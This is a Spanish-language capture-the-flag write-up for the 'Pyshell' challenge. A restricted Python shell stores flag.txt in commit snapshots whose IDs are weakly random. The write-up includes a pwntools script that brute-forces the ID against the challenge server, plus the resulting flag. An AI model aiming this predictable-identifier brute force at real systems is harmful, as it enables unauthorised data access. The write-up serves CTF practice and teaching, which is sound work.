# Pyshell

Es una shell de python donde estamos limitados a unos pocos comandos, no podemos leer `flag.txt` con el comando `cat`

Al ejecutar `git commit` se crea un snapshot con id `"{tiempo actual en segundos}-{hash sha256 de un numero aleatorio entre 1 y 10000 acortado a 6 bytes}"`
```python
    def _git_commit(self, args):
        if args:
            print("Usage: git commit")
            return

        import time, random, hashlib

        commit_time = int(time.time())
        rand_val = random.randint(1, 10000)
        hash_val = hashlib.sha256(str(rand_val).encode()).hexdigest()[:6]
        commit_id = f"{commit_time}-{hash_val}"

        def snapshot(directory):
            data = {}
            for name, entry in directory.entries.items():
                if isinstance(entry, File):
                    data[name] = (entry.content, "file")
                elif isinstance(entry, Directory):
                    data[name] = snapshot(entry)
                elif isinstance(entry, Symlink):
                    data[name] = (
                        entry.target,
                        "symlink",
                    )
            return data

        commit_snapshot = snapshot(self.fs["/"])
        print(commit_id)
        self.commit_history[commit_id] = commit_snapshot
        print(f"Committed.")
```
El método `_git_snapshot` es una función que muestra el contenido de un commit específico en un sistema de control de versiones

```
    def _git_snapshot(self, args):
        if len(args) != 1:
            print("Usage: git snapshot <commit_id>")
            return

        commit_id = args[0]

        if commit_id not in self.commit_history:
            print("Error: Commit ID not found.")
            return

        def print_snapshot(snapshot, indent=0):
            for name, entry in snapshot.items():
                prefix = " " * indent
                if isinstance(entry, tuple):
                    if entry[1] == "symlink":
                        print(f"{prefix}{name} -> {entry[0]} (Symlink)")
                    else:
                        print(f"{prefix}{name} (File)")
                        print(
                            f"{prefix}---\n{prefix}Content:\n{prefix}{entry[0]}\n{prefix}---"
                        )
                else:
                    print(f"{prefix}{name}/ (Directory)")
                    print_snapshot(entry, indent + 4)

        print(f"Snapshot of commit {commit_id}:")
        print_snapshot(self.commit_history[commit_id])
```

Si agregamos unas lineas para ver lo que contiene un snapshot creado con git commit encontramos que almacena el contenido de flag.txt:
``` python3
        commit_snapshot = snapshot(self.fs["/"])
        # Agregamos aqui estas lineas para depurar
        print(commit_id)                              
        print(commit_snapshot)
        # ----
        self.commit_history[commit_id] = commit_snapshot
        print(f"Committed.")

    def _git_status(self, args):
        if args:
            print("Usage: git status")
            return
```

```
> python3 shell.py
/$ git commit
1743957474-1c63ed
{'flag.txt': ('[REDACTED]', 'file'), 'shell.history': ('git commit', 'file'), '.Trash': {}}
Committed.
/$
```

Lo que debemos hacer es crear un snapshot y tratar de obtener su id mediante fuerza bruta para leer el contenido de flag.txt

## Exploit
``` python3
from pwn import *
import hashlib
import time

# Generate hashes
prehashes = [hashlib.sha256(str(i).encode()).hexdigest()[:6] for i in range(1, 10001)]

# Brute-force
io = remote("challs.breachers.in", 1340)

commit_time = int(time.time())
io.sendlineafter(b"/$ ", b"git commit")

for i,hash_val in enumerate(prehashes):
    payload = b"git snapshot " 
    payload += str(commit_time).encode()
    payload += f"-{hash_val}".encode()
    print(f"{i} -- ", payload)
    io.sendlineafter(b"/$ ", payload)
    line = io.recvline()
    if not b"Error: Commit ID not found" in line:
        break

success(io.recv())
```

```
5351 --  b'git snapshot 1743955172-044c06'
5352 --  b'git snapshot 1743955172-c34ae0'
5353 --  b'git snapshot 1743955172-2a6496'
5354 --  b'git snapshot 1743955172-89be54'
5355 --  b'git snapshot 1743955172-9e25d9'
5356 --  b'git snapshot 1743955172-47570b'
5357 --  b'git snapshot 1743955172-50e65b'
5358 --  b'git snapshot 1743955172-c5d27a'
5359 --  b'git snapshot 1743955172-c702d8'
5360 --  b'git snapshot 1743955172-a68a5f'
5361 --  b'git snapshot 1743955172-38bfb4'
5362 --  b'git snapshot 1743955172-c426ad'
5363 --  b'git snapshot 1743955172-b346a1'
5364 --  b'git snapshot 1743955172-dd5c33'
5365 --  b'git snapshot 1743955172-2c5ae0'
/home/kalcast/venv/lib/python3.12/site-packages/pwnlib/log.py:347: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'success')
[+] flag.txt (File)
    ---
    Content:
    Breach{cr4ck3d_7h3_dummy_5h311_db0192d2e01}
    ---
    shell.history (File)
    ---
    Content:
    git commit
    ---
    .Trash/ (Directory)
    /$
[*] Closed connection to challs.breachers.in port 1340
```

`Breach{cr4ck3d_7h3_dummy_5h311_db0192d2e01}`
